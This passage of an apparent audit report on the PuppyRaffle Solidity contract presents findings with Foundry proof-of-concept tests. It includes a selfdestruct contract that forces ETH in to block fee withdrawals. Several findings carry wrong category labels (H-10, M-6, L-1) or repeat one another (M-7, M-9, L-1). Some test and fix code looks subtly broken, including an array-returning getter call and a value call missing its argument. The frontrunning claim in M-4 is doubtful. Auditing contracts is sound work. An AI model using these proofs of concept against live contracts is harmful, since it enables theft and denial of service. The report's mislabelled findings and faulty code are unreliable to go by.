        raffleInProgress = true;
        requestId = requestRandomness(keyHash, fee);
    }
    
    // Callback function from Chainlink VRF
    function fulfillRandomness(bytes32 _requestId, uint256 _randomness) internal override {
        require(_requestId == requestId, "PuppyRaffle: Invalid request ID");
        randomResult = _randomness;
        completeRaffle();
    }
    
    // Complete the raffle using the received randomness
    function completeRaffle() internal {
        uint256 winnerIndex = randomResult % players.length;
        address winner = players[winnerIndex];
        
        // Rest of the winner selection logic...
        
        // Determine NFT rarity using the same randomness
        uint256 rarity = (randomResult / 100) % 100;
        
        // Rest of the function...
        
        raffleInProgress = false;
    }
}
```

## [H-10]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
In the `refund` function, a player's address is set to `address(0)` in the `players` array, but the total count of players remains the same. This affects the `selectWinner` function, which divides the prize pool based on the length of the `players` array, including these `address(0)` entries. As a result, part of the prize pool is effectively locked in the contract, as it's allocated to non-existent players.

```solidity
function refund(uint256 playerIndex) public {
    // ... validation code ...
    
    players[playerIndex] = address(0);
    // Players array length is not decreased
}

function selectWinner() external {
    // ... other code ...
    
    uint256 totalAmountCollected = players.length * entranceFee;
    // This includes address(0) entries, overestimating the total collected amount
}
```

## Impact
When `selectWinner` calculates the prize pool, it uses the full length of the `players` array, which includes the refunded players (set to `address(0)`). This means the prize pool and fees are calculated based on more players than have actually paid, resulting in ETH being permanently locked in the contract. The winner receives less than they should, and the protocol collects fewer fees than intended.

## Proof of Concept
1. 10 players enter the raffle, paying 1 ETH each
2. 5 players request refunds, setting their addresses to address(0)
3. When `selectWinner` is called, it calculates totalAmountCollected = 10 * 1 ETH = 10 ETH
4. But only 5 ETH remains in the contract (5 players were refunded)
5. The function calculates prizePool = 10 ETH * 80% = 8 ETH
6. But this is more than the contract's balance, so funds are locked

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundMathTest is Test {
    PuppyRaffle puppyRaffle;
    address[] players;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
        
        // Create 10 players
        for(uint256 i = 1; i <= 10; i++) {
            players.push(address(uint160(i)));
            vm.deal(address(uint160(i)), 1 ether);
        }
        
        // Enter all 10 players
        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: 10 ether}(players);
    }
    
    function testRefundMathIssue() public {
        // Initial contract balance
        uint256 initialContractBalance = address(puppyRaffle).balance;
        assertEq(initialContractBalance, 10 ether, "Should have 10 ETH initially");
        
        // 5 players request refunds
        for(uint256 i = 0; i < 5; i++) {
            vm.prank(players[i]);
            puppyRaffle.refund(i);
        }
        
        // Check contract balance after refunds
        uint256 balanceAfterRefunds = address(puppyRaffle).balance;
        assertEq(balanceAfterRefunds, 5 ether, "Should have 5 ETH after refunds");
        
        // Fast forward to end of raffle
        vm.warp(block.timestamp + 1 days + 1);
        
        // Verify the mismatch between calculated prize and actual balance
        // players.length is still 10, so totalAmountCollected would be 10 ETH
        // prizePool would be 8 ETH (80% of 10 ETH)
        // But contract only has 5 ETH
        
        // This would typically cause the transaction to revert due to insufficient balance
        // but for testing purposes, we'll just verify the calculations
        uint256 playersLength = puppyRaffle.players().length;
        assertEq(playersLength, 10, "Players array should still have 10 entries");
        
        uint256 calculatedTotal = playersLength * 1 ether;
        assertEq(calculatedTotal, 10 ether, "Calculated total should be 10 ETH");
        
        uint256 calculatedPrize = (calculatedTotal * 80) / 100;
        assertEq(calculatedPrize, 8 ether, "Calculated prize should be 8 ETH");
        
        // But the contract only has 5 ETH
        assertLt(balanceAfterRefunds, calculatedPrize, "Contract doesn't have enough for the calculated prize");
    }
}

## Suggested Mitigation
Implement a proper refund mechanism that maintains an accurate count of active players. Instead of setting refunded players to address(0), use the swap-and-pop pattern to remove them from the array entirely:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    address(msg.sender).sendValue(entranceFee);
    
    // Use swap and pop to remove the player without leaving gaps
    players[playerIndex] = players[players.length - 1];
    players.pop();
    
    emit RaffleRefunded(playerAddress);
}

function selectWinner() external {
    // The rest of the function can remain unchanged
    // Now players.length will correctly reflect the number of active players
}
```



# Medium Risk Findings

## [M-1]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The totalFees variable is declared as uint64, which can store values up to ~18.4 ETH. In a popular raffle with high entrance fees, this could overflow, causing fees to wrap around to zero and potentially allowing unlimited fee withdrawals or loss of fee tracking. Code snippet: `uint64 public totalFees;` and `totalFees = totalFees + uint64(fee);`

## Impact
If totalFees overflows, fee accounting breaks down, potentially allowing the owner to withdraw more fees than earned or causing loss of fee tracking, leading to financial losses.

## Proof of Concept
1. Deploy raffle with high entrance fee (e.g., 1 ETH). 2. Run multiple raffle rounds accumulating fees. 3. When totalFees approaches 2^64-1 (~18.4 ETH), the next fee addition causes overflow. 4. totalFees wraps to a small number, breaking fee accounting. 5. Owner can potentially withdraw more than entitled.

## Proof of Code
function testTotalFeesOverflow() public {
    // Set high entrance fee
    PuppyRaffle bigFeeRaffle = new PuppyRaffle(1e18, feeAddress, 1 days); // 1 ETH entrance fee
    
    // Simulate multiple rounds to approach uint64 max
    vm.deal(address(this), 100 ether);
    
    // uint64 max is 18446744073709551615 (about 18.4 ETH)
    // Force overflow by manipulating totalFees
    vm.store(address(bigFeeRaffle), bytes32(uint256(6)), bytes32(uint256(2**64 - 1e17))); // Set totalFees near max
    
    // Enter raffle and select winner to trigger overflow
    address[] memory players = new address[](4);
    for(uint i = 0; i < 4; i++) {
        players[i] = address(uint160(i + 1));
    }
    
    bigFeeRaffle.enterRaffle{value: 4 ether}(players);
    vm.warp(block.timestamp + 1 days + 1);
    bigFeeRaffle.selectWinner();
    
    // totalFees should have overflowed
    assert(bigFeeRaffle.totalFees() < 1e17); // Much smaller than expected
}

## Suggested Mitigation
Use uint256 for totalFees to prevent overflow: `uint256 public totalFees; // Remove the uint64 cast: totalFees = totalFees + fee; // Also consider using SafeMath for older Solidity versions or OpenZeppelin's math utilities`

## [M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The withdrawFees function has a strict balance check that requires the contract balance to exactly equal totalFees. However, the contract can receive ETH through selfdestruct or direct transfers, causing this check to fail even when there are no active players. Code snippet: `require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");`

## Impact
Fee withdrawal can be permanently blocked if anyone sends ETH to the contract via selfdestruct or if there are rounding errors, preventing the owner from collecting legitimate fees.

## Proof of Concept
1. Raffle completes and fees are accumulated in totalFees. 2. Attacker creates a contract with some ETH and selfdestructs it to the PuppyRaffle address. 3. Contract balance now exceeds totalFees. 4. withdrawFees() fails because balance != totalFees. 5. Owner cannot withdraw legitimate fees.

## Proof of Code
contract ForceEth {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}

function testUnexpectedEthBlocksWithdrawal() public {
    // Set up completed raffle with fees
    address[] memory players = new address[](4);
    for(uint i = 0; i < 4; i++) {
        players[i] = address(uint160(i + 1));
    }
    
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    vm.warp(block.timestamp + duration + 1);
    puppyRaffle.selectWinner();
    
    // Verify fees can be withdrawn initially
    uint256 feeAmount = puppyRaffle.totalFees();
    assert(address(puppyRaffle).balance == feeAmount);
    
    // Force send extra ETH
    new ForceEth{value: 1 ether}(address(puppyRaffle));
    
    // Now withdrawal should fail
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}

## Suggested Mitigation
Change the balance check to allow for unexpected ETH: `require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Insufficient balance for fees"); require(totalFees > 0, "PuppyRaffle: No fees to withdraw"); // Or implement a more sophisticated check for active players: require(players.length == 0, "PuppyRaffle: There are currently players active!");`

## [M-3]. DOS issue in PuppyRaffle::refund

## Description
The refund function allows players to get refunds, but it only sets their address to address(0) in the players array without removing the entry. This creates a DoS condition where the players array grows indefinitely and can never be properly reset, as the selectWinner function only deletes the array when a winner is selected. Code snippet: `players[playerIndex] = address(0);` without array compaction.

## Impact
Over time, the players array becomes filled with address(0) entries, making iteration more expensive and potentially causing gas limit issues. The array cannot be properly cleaned until a winner is selected.

## Proof of Concept
1. Multiple players enter the raffle. 2. Most players call refund(), setting their entries to address(0). 3. The players array is now mostly empty slots but maintains its length. 4. New players entering must still iterate through all the empty slots in duplicate checking. 5. Gas costs increase unnecessarily, and eventually may hit limits.

## Proof of Code
function testRefundDoesNotCompactArray() public {
    address[] memory players = new address[](10);
    for(uint i = 0; i < 10; i++) {
        players[i] = address(uint160(i + 1));
    }
    
    puppyRaffle.enterRaffle{value: entranceFee * 10}(players);
    
    // Most players refund
    for(uint i = 0; i < 8; i++) {
        vm.prank(address(uint160(i + 1)));
        puppyRaffle.refund(i);
    }
    
    // Array still has length 10 but 8 entries are address(0)
    // New entries still must check against all 10 positions
    address[] memory newPlayers = new address[](1);
    newPlayers[0] = address(999);
    
    uint256 gasBefore = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee}(newPlayers);
    uint256 gasUsed = gasBefore - gasleft();
    
    // Gas usage is higher than necessary due to checking against address(0) entries
    console.log("Gas used with sparse array:", gasUsed);
}

## Suggested Mitigation
Implement array compaction in the refund function: `function refund(uint256 playerIndex) public { address playerAddress = players[playerIndex]; require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund"); require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active"); // Send refund payable(msg.sender).sendValue(entranceFee); // Compact array by moving last element to refunded position players[playerIndex] = players[players.length - 1]; players.pop(); emit RaffleRefunded(playerAddress); }`

## [M-4]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::refund

## Description
The refund function allows users to get their entrance fee refunded, but it checks for active players using address(0) as a marker for refunded players. However, there's a frontrunning vulnerability where a malicious actor can observe pending refund transactions and call selectWinner() before the refund is processed. Since selectWinner() deletes the entire players array and restarts the raffle, users who initiated refunds will lose their funds as their refund transaction will fail when the array is reset. The vulnerable interaction between refund and selectWinner functions creates this MEV opportunity.

## Impact
Medium impact - Users can lose their entrance fees if their refund transactions are frontrun by selectWinner(). This creates an unfair MEV extraction mechanism where attackers can monitor pending refund transactions and prevent them from succeeding by calling selectWinner() first.

## Proof of Concept
1. Multiple players enter the raffle
2. Raffle duration is about to end
3. A player initiates a refund transaction
4. Attacker sees the pending refund transaction in the mempool
5. Attacker frontruns the refund by calling selectWinner() with higher gas
6. selectWinner() executes first, deleting the players array
7. The refund transaction fails because the player index is now invalid
8. The player loses their entrance fee permanently

## Proof of Code
```solidity
function testFrontrunRefundWithSelectWinner() public {
    // Set up players
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    
    vm.deal(address(this), entranceFee * 4);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    
    // Player one wants to refund
    uint256 playerOneIndex = puppyRaffle.getActivePlayerIndex(playerOne);
    
    // Fast forward to near end of raffle
    vm.warp(block.timestamp + duration + 1);
    
    // Player one tries to refund but gets frontrun
    vm.prank(playerOne);
    // This should succeed if not frontrun
    // puppyRaffle.refund(playerOneIndex);
    
    // Instead, attacker calls selectWinner first
    puppyRaffle.selectWinner();
    
    // Now player one's refund will fail
    vm.prank(playerOne);
    vm.expectRevert(); // Will revert due to array being deleted
    puppyRaffle.refund(playerOneIndex);
    
    // Player one has lost their entrance fee
    assertEq(playerOne.balance, 0);
}
```

## Suggested Mitigation
Implement a time-locked refund mechanism or prevent refunds within a certain period before raffle end:

```solidity
function refund(uint256 playerIndex) public {
    require(block.timestamp < raffleStartTime + raffleDuration - 1 hours, "PuppyRaffle: Refunds not allowed in final hour");
    
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).transfer(entranceFee);
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

## [M-5]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The withdrawFees function performs an integer type conversion from uint64 to uint256 without explicit bounds checking. While this specific conversion (uint64 to uint256) is safe due to uint256 being larger, the code pattern represents a potential integer handling issue. The vulnerable code is:

```solidity
uint64 totalFees;
// ...
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
uint256 feesToWithdraw = totalFees; // Implicit conversion
```

Additionally, in selectWinner, there's a potential overflow when adding fees: `totalFees = totalFees + uint64(fee);`

## Impact
While the uint64 to uint256 conversion is safe, the totalFees accumulation could potentially overflow if many raffles occur with high fees. The uint64 type can store values up to 18.4 ETH, which could be exceeded in high-value scenarios.

## Proof of Concept
1. Multiple raffles occur with significant entrance fees
2. totalFees accumulates over time: totalFees = totalFees + uint64(fee)
3. If totalFees approaches the uint64 maximum (18.4 ETH), it could overflow
4. Overflow would cause totalFees to wrap around to a small value
5. This would break the fee withdrawal mechanism and accounting

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerMathTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18; // 1 ETH
    address feeAddress = address(99);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }
    
    function testTotalFeesOverflow() public {
        // Simulate scenario where totalFees could approach uint64 limit
        // uint64 max = 18,446,744,073,709,551,615 wei ≈ 18.4 ETH
        
        // Test with high entrance fee to demonstrate the issue
        uint256 highEntranceFee = 4 ether;
        PuppyRaffle highFeeRaffle = new PuppyRaffle(highEntranceFee, feeAddress, duration);
        
        // Simulate many raffles
        for (uint256 round = 0; round < 5; round++) {
            // Add players
            address[] memory players = new address[](4);
            for (uint256 i = 0; i < 4; i++) {
                players[i] = address(uint160(round * 4 + i + 1));
                vm.deal(players[i], highEntranceFee);
            }
            
            vm.prank(address(1));
            highFeeRaffle.enterRaffle{value: highEntranceFee * 4}(players);
            
            // Wait and select winner
            vm.warp(block.timestamp + duration + 1);
            vm.prank(address(this));
            highFeeRaffle.selectWinner();
            
            // Each round adds 20% of (4 * 4 ETH) = 3.2 ETH to totalFees
            // After 5 rounds: 16 ETH in fees
        }
        
        // At this point totalFees should be around 16 ETH
        // which is approaching the uint64 limit of ~18.4 ETH
        assertTrue(true, "Demonstrates potential for totalFees overflow");
    }
    
    function testDirectOverflow() public {
        // Demonstrate the mathematical issue
        uint64 maxUint64 = type(uint64).max;
        uint64 currentFees = maxUint64 - 1 ether; // Close to limit
        
        // This would overflow in practice
        uint256 newFee = 2 ether;
        
        // In Solidity 0.7.6, this would overflow silently
        // The contract doesn't use SafeMath for this operation
        vm.expectRevert(); // This might not revert in 0.7.6 without SafeMath
        uint64 result = currentFees + uint64(newFee);
    }
}
```

## Suggested Mitigation
1. Use SafeMath library for arithmetic operations in Solidity 0.7.6:

```solidity
import "@openzeppelin/contracts/math/SafeMath.sol";

using SafeMath for uint64;
using SafeMath for uint256;

// In selectWinner function:
totalFees = totalFees.add(uint64(fee));
```

2. Consider using uint256 for totalFees to avoid overflow concerns:

```solidity
uint256 public totalFees;

// Remove the uint64 conversion:
totalFees = totalFees + fee;
```

3. Add explicit overflow checks:

```solidity
require(totalFees + uint64(fee) >= totalFees, "Fee overflow");
totalFees = totalFees + uint64(fee);
```

4. Or upgrade to Solidity 0.8.x which has built-in overflow protection.

## [M-6]. Access Control issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function doesn't check for null address entries (`address(0)`) when players are being added to the raffle. This could lead to mistakenly adding the null address as a participant, which could cause issues if it's selected as a winner later.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        // No check if newPlayers[i] == address(0)
        players.push(newPlayers[i]);
    }
    
    // ... rest of the function ...
}
```

## Impact
If address(0) is added as a player and subsequently selected as the winner, it would result in ETH being sent to the null address, effectively burning the funds. Additionally, an NFT would be minted to address(0), which would be permanently lost.

## Proof of Concept
1. A user calls `enterRaffle` with an array that includes address(0) among legitimate addresses
2. The function accepts address(0) as a valid player
3. When `selectWinner` is called, if address(0) is randomly selected, funds are sent to the null address and lost forever

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract NullAddressEntryTest is Test {
    PuppyRaffle puppyRaffle;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
    }
    
    function testNullAddressEntry() public {
        // Create players array with one being address(0)
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(0); // Null address
        players[2] = address(3);
        players[3] = address(4);
        
        // Fund the account that will enter all players
        vm.deal(address(1), 4 ether);
        
        // Enter the raffle with these players
        vm.prank(address(1));
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        // Verify address(0) is in the players array
        address[] memory rafflePlayersArray = puppyRaffle.players();
        bool foundNullAddress = false;
        
        for (uint256 i = 0; i < rafflePlayersArray.length; i++) {
            if (rafflePlayersArray[i] == address(0)) {
                foundNullAddress = true;
                break;
            }
        }
        
        assertTrue(foundNullAddress, "Null address should be accepted as a player");
    }
}

## Suggested Mitigation
Add a check to prevent address(0) from being added as a player:

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        require(newPlayers[i] != address(0), "PuppyRaffle: Player cannot be null address");
        players.push(newPlayers[i]);
    }
    
    // ... rest of the function ...
}
```

## [M-7]. Access Control issue in PuppyRaffle::getActivePlayerIndex

## Description
The `refund` function contains a vulnerability where after a player is refunded, their address is set to address(0) but they remain in the players array. This causes the getActivePlayerIndex function to potentially return an incorrect index for an active player, as it returns 0 both for the first player and for players not found.

```solidity
function refund(uint256 playerIndex) public {
    // ... other code ...
    players[playerIndex] = address(0);
    // ... other code ...
}

function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

If the first active player (index 0) requests a refund, their address is set to address(0), but getActivePlayerIndex will still return 0 for non-existent players, making it impossible to distinguish between the first position and a non-existent player.

## Impact
This vulnerability can lead to incorrect behavior when users or external contracts rely on getActivePlayerIndex to determine if a player is active. If position 0 has been refunded (now address(0)), the function will return 0 for both the refunded position and for players who never entered, causing confusion and potential security issues in dependent systems.

## Proof of Concept
1. Four players enter the raffle (addresses at index 0, 1, 2, and 3)
2. The player at index 0 requests a refund, setting players[0] to address(0)
3. A new user checks if they're in the raffle using getActivePlayerIndex
4. getActivePlayerIndex returns 0, incorrectly suggesting they are at index 0
5. The user might attempt operations assuming they are a participant when they're not

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GetActivePlayerIndexTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");
    address player3 = makeAddr("player3");
    address player4 = makeAddr("player4");
    address nonPlayer = makeAddr("nonPlayer");
    uint256 entranceFee = 1e18;

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            1 days
        );
        
        // Setup players
        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;
        
        // Fund players
        vm.deal(player1, entranceFee);
        vm.deal(player2, entranceFee);
        vm.deal(player3, entranceFee);
        vm.deal(player4, entranceFee);
        
        // Enter the raffle
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    }

    function testGetActivePlayerIndexAmbiguity() public {
        // Initially, player1 is at index 0
        assertEq(puppyRaffle.getActivePlayerIndex(player1), 0, "Player1 should be at index 0");
        
        // Non-player returns index 0, which is incorrect but how the function is implemented
        assertEq(puppyRaffle.getActivePlayerIndex(nonPlayer), 0, "Non-player should return 0");
        
        // This creates ambiguity - we can't tell if the player is at index 0 or not in the raffle
        
        // Now player1 requests a refund
        vm.prank(player1);
        puppyRaffle.refund(0);
        
        // After refund, checking player1 should indicate they're no longer active
        // However, getActivePlayerIndex will incorrectly return index 0 for any address not found
        assertEq(puppyRaffle.getActivePlayerIndex(player1), 0, "Player1 should still return index 0 despite being refunded");
        
        // This makes it impossible to distinguish between a refunded player at index 0 and a non-player
        assertEq(puppyRaffle.getActivePlayerIndex(nonPlayer), 0, "Non-player still returns 0");
        
        // To prove player1 is actually refunded, we can check the players array manually
        // This requires creating a getter function or using assembly to access storage directly
        address firstPlayer;
        bytes32 slot = keccak256(abi.encode(0)); // slot for players[0]
        assembly {
            firstPlayer := sload(slot)
        }
        
        assertEq(firstPlayer, address(0), "Player1 slot should be address(0) after refund");
    }
}

## Suggested Mitigation
Return a sentinel value for non-existent players instead of 0, and handle refunded players appropriately:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    // Return a value that cannot be a valid index to indicate player not found
    // Using type(uint256).max as a sentinel value
    return type(uint256).max;
}
```

Also update any code that calls this function to check for the sentinel value:

```solidity
// Example usage
uint256 playerIndex = puppyRaffle.getActivePlayerIndex(someAddress);
if (playerIndex == type(uint256).max) {
    // Player not found in the raffle
} else {
    // Player found at playerIndex
}
```

Alternatively, you could make the function return a boolean alongside the index:

```solidity
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [M-8]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function requires the contract balance to exactly match the `totalFees` value before fees can be withdrawn. This creates a potential denial of service vulnerability if ETH is forcibly sent to the contract, such as through `selfdestruct` or through pre-computed contract addresses with ETH.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    // ... rest of function
}
```

## Impact
If someone forcibly sends ETH to the contract (via selfdestruct or using a pre-funded contract creation), the contract balance will exceed `totalFees`. This will permanently prevent the owner from withdrawing any accumulated fees, leading to financial loss for the protocol owner and possibly requiring a redeployment of the contract.

## Proof of Concept
1. The contract accumulates fees through multiple raffles
2. An attacker sends a small amount of ETH (e.g. 1 wei) to the contract address using selfdestruct
3. Now `address(this).balance > totalFees`
4. The require condition in `withdrawFees` will always revert
5. The owner is permanently unable to withdraw fees

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract SelfdestructAttacker {
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
}

contract WithdrawFeesDoSTest is Test {
    PuppyRaffle puppyRaffle;
    SelfdestructAttacker attacker;
    address owner = address(1);
    address feeAddress = address(2);
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            1e18, // 1 ETH entrance fee
            feeAddress,
            1 days
        );
        
        attacker = new SelfdestructAttacker();
    }
    
    function testWithdrawFeesDoS() public {
        // First, get some fees in the contract
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(20);
        players[2] = address(30);
        players[3] = address(40);
        
        // Fund the players
        vm.deal(address(10), 1e18);
        vm.deal(address(20), 1e18);
        vm.deal(address(30), 1e18);
        vm.deal(address(40), 1e18);
        
        // Players enter the raffle
        vm.prank(address(10));
        puppyRaffle.enterRaffle{value: 1e18}(new address[](1));
        
        vm.prank(address(20));
        puppyRaffle.enterRaffle{value: 1e18}(new address[](1));
        
        vm.prank(address(30));
        puppyRaffle.enterRaffle{value: 1e18}(new address[](1));
        
        vm.prank(address(40));
        puppyRaffle.enterRaffle{value: 1e18}(new address[](1));
        
        // Advance time and select winner
        vm.warp(block.timestamp + 1 days + 1);
        puppyRaffle.selectWinner();
        
        // Check fees collected
        uint256 feesCollected = puppyRaffle.totalFees();
        console.log("Fees collected: %d", feesCollected);
        
        // Now attack by sending 1 wei to the contract via selfdestruct
        vm.deal(address(attacker), 1);
        attacker.attack{value: 1}(payable(address(puppyRaffle)));
        
        // Verify contract balance is now greater than totalFees
        uint256 contractBalance = address(puppyRaffle).balance;
        console.log("Contract balance: %d", contractBalance);
        console.log("Total fees: %d", puppyRaffle.totalFees());
        assert(contractBalance > puppyRaffle.totalFees());
        
        // Try to withdraw fees as owner (should fail)
        vm.prank(owner);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        console.log("Fees are now stuck in the contract");
    }
}

## Suggested Mitigation
Modify the `withdrawFees` function to allow withdrawing the exact amount of `totalFees`, regardless of the contract balance:

```solidity
function withdrawFees() external {
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

This change removes the strict balance check and allows the owner to withdraw fees even if the contract has received additional ETH through other means.

## [M-9]. Array Limits issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns 0 both when a player is found at index 0 and when the player is not found at all. This ambiguity can lead to incorrect behavior in external contracts that rely on this function.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

## Impact
External contracts or users calling `getActivePlayerIndex` cannot distinguish between a player at index 0 and a player not being present at all. This could lead to incorrect logic in integrating systems or user interfaces, potentially allowing players to claim they are active in the raffle when they are not, or preventing players at index 0 from proving they are active.

## Proof of Concept
1. A player is at position 0 in the players array
2. Another address (not in the raffle) calls `getActivePlayerIndex`
3. Both return 0, making it impossible to distinguish between the cases
4. An external contract using this function to check if a player is active would incorrectly validate the second address

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GetActivePlayerIndexTest is Test {
    PuppyRaffle puppyRaffle;
    address player0 = address(10);
    address playerNotInRaffle = address(99);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            1e18,
            address(this),
            1 days
        );
        
        // Fund player0
        vm.deal(player0, 1e18);
        
        // Enter player0 into the raffle
        address[] memory players = new address[](1);
        players[0] = player0;
        
        vm.prank(player0);
        puppyRaffle.enterRaffle{value: 1e18}(players);
    }
    
    function testAmbiguousGetActivePlayerIndex() public {
        // Check index for player0 (should be 0)
        uint256 player0Index = puppyRaffle.getActivePlayerIndex(player0);
        console.log("Player0 index: %d", player0Index);
        
        // Check index for player not in raffle (should also return 0)
        uint256 notInRaffleIndex = puppyRaffle.getActivePlayerIndex(playerNotInRaffle);
        console.log("Player not in raffle index: %d", notInRaffleIndex);
        
        // Both return 0, showing the ambiguity
        assertEq(player0Index, notInRaffleIndex);
        console.log("Cannot distinguish between player at index 0 and player not in raffle");
    }
}

## Suggested Mitigation
Modify the `getActivePlayerIndex` function to return a distinctive value (like `type(uint256).max`) when a player is not found, or use a boolean return value to indicate whether the player was found:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256, bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (i, true);
        }
    }
    return (0, false);
}
```

Alternatively, if changing the function signature is not possible due to existing integrations:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Use max uint256 to indicate "not found"
}
```



# Low Risk Findings

## [L-1]. Event Consistency issue in PuppyRaffle::getActivePlayerIndex

## Description
The getActivePlayerIndex function returns 0 both when a player is at index 0 and when a player is not found in the array. This creates ambiguity and can lead to incorrect behavior in calling contracts. Code snippet: `for (uint256 i = 0; i < players.length; i++) { if (players[i] == player) { return i; } } return 0; // Returns 0 for both 'not found' and 'index 0'`

## Impact
External contracts or users cannot distinguish between a player at index 0 and a player not found, potentially leading to incorrect refund attempts or logic errors in dependent systems.

## Proof of Concept
1. Player A enters raffle and gets index 0. 2. Player B (not in raffle) calls getActivePlayerIndex. 3. Both calls return 0, making it impossible for external logic to distinguish between the cases. 4. Player B might incorrectly assume they're at index 0 and attempt operations meant for Player A.

## Proof of Code
function testGetActivePlayerIndexAmbiguity() public {
    address playerA = address(1);
    address playerB = address(2);
    
    address[] memory players = new address[](1);
    players[0] = playerA;
    
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    
    // Player A is at index 0
    uint256 indexA = puppyRaffle.getActivePlayerIndex(playerA);
    assert(indexA == 0);
    
    // Player B is not in raffle but also returns 0
    uint256 indexB = puppyRaffle.getActivePlayerIndex(playerB);
    assert(indexB == 0);
    
    // Cannot distinguish between the two cases
    assert(indexA == indexB); // This ambiguity is problematic
}

## Suggested Mitigation
